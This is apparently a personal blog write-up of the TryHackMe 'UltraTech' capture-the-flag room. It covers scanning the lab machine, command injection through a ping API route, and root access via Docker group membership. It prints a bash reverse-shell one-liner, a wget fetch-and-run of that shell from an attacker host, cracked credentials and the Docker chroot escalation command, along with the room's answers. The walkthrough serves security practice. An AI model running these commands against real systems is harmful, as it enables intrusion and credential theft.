---
title: "Try Hack Me: UltraTech"
date: 2020-12-29
tags: [CTF]
excerpt: "Nmap, BurpSuite, SSH and Docker"
---

## CTF Introduction
[UltraTech](https://tryhackme.com/room/ultratech1) is a Try Hack Me room created by [lp1](https://tryhackme.com/p/lp1). The room is rated as an medium CTF, making it good for practice and learning of niche topics/applications. It is set up as a gray-box, with some useful information being provided in each section.

There are four sections with their own questions in this room:
1. Deployment
2. Enumeration
3. Exploitation
4. Root

--- 

## 1. Deployment
This part just ensures that you have joined the room and have deployed the machine.

## 2. Enumeration

### Questions
1. Which software is using port 8081? `node.js`
2. Which other non-standard port is used? `31331`
3. Which software is using this port? `Apache`
4. Which GNU/Linux distribution seems to be used? `Ubuntu`
5. The software using port 8080 is a REST api, how many of its routes are used by the web application? `2` (Note: this question is supposed to say 8081).

### Initial Nmap
Questions 1-4 can be answered with a simple Nmap as follows:
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-29 01:24 GMT
Nmap scan report for 10.10.194.251
Host is up (0.27s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
8081/tcp  open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### FTP
No anonymous login with FTP, so I'll leave it for now.

### IP:8081/
Nothing of interest here aside from an UltraTech API version number (0.1.3).

The room also states that port 8081 is using a REST API, meaning it likely handles logins for the other webpage.

### IP:31331/
As this appears to be a webpage built from a template, I used Gobuster to find any hidden files/directories.

Gobuster found `/partners.html` which appears to be a login page.

### IP:3133/partners.html/
By making an attempt to login with `admin:admin`, the webpage redirects to `IP:8080/auth?login=...`.

Making another attempt to login and intercepting it with BurpSuite shows there are two different methods/routes that the service on port 8081 handles:
* `/auth?login=...` - login authentication
* `/ping?ip=...` - ensure the API can talk to the machine

## 3. Exploitation

### Questions
1. There is a database lying around, what is its filename? `utech.db.sqlite`
2. What is the first user's password hash? `f357a0c52799563c7c7b76c1e7543a32`
3. What is the password associated with this hash? `n100906`

### API Enumeration
Using the `/ping?ip={IP}` route that was found, I modified the IP address to attempt a ping to my attacking VM. As the ping was successful, I tried other commands using backticks as escape characters. As I could execute a `whoami` command, I tried uploading a bash reverse shell as follows:
* Create shell.sh with the following script: `bash -i >& /dev/tcp/{attacker IP}/1337 0>&1`
* Host a python webserver using `python3 -m http.server`
* Start a listener using `sudo nc -lnvp 1337`
* Modify the ping URL as: ``` /ping?ip=`wget {attacker IP}:8000/shell.sh` ```
* Run the shell through the URL with ``` /ping?ip=`bash shell.sh` ```

### Reverse Shell
In `/home/www/api`, there is a database file called `utech.db.sqlite`.

Within the databse, there are two users and two hashes:
* r00t:r00t:f357a0c52799563c7c7b76c1e7543a32
* admin:0d0ea5111e3c1def594c1684e3b9be84

Using [Crackstation](https://crackstation.net/) the hashes were cracked resulting in the following two sets of credentials:
* r00t:n100906
* admin:mrsheafy

## 4. Root

### Question
1. What are the first 9 characters of the root user's private SSH key? `MIIEogIBA`

### SSH
I logged into the SSH service as the user r00t with `ssh r00t@{IP}`. As this user is not root, there is no immediate access to `/root/`.

Additionally, running `sudo -l` reveals there are no sudo permissions for the user r00t.

### Privilege Escalation
I uploaded [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) using the same method as before with python. Upon running the script, it immediately showed that r00t was a member of the group `docker`.

[GTFObins](https://gtfobins.github.io/gtfobins/docker/#shell) shows a privilege escalation to root using the docker command: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh`. Running this however, does not work, as there is no image `alpine`.

`docker ps -a` reveals there is an image named `bash`, so running the command instead as `docker run -v /:/mnt --rm -it bash chroot /mnt sh` results in a privilege escalation to root.

### SSH Key
As the question asks for the first 9 characters of root's private SSH key, navigate to `/root/.ssh` and cat out `id_rsa` to reveal the key.

## Summary
All in all, this was a fun and challenging room. I have not worked with Docker prior to this room so I had to upskill a little in Docker's terminology to understand what the GTFObins command was doing. The room also served as a good refresher to check what groups the user is a part of, as I could have saved some time instead of uploading and running LinPEAS. Thank you to lp1 for the great challenge of UltraTech.

<img src="https://tryhackme-badges.s3.amazonaws.com/cjboyd.png" alt="TryHackMe">